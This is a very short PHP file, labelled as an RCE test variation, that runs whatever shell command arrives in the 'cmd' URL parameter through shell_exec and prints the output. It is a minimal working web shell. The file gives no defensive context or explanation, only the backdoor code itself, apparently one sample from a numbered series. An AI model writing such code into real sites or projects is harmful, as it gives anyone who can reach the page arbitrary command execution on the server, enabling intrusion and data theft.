<?php
// RCE test variation #687
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>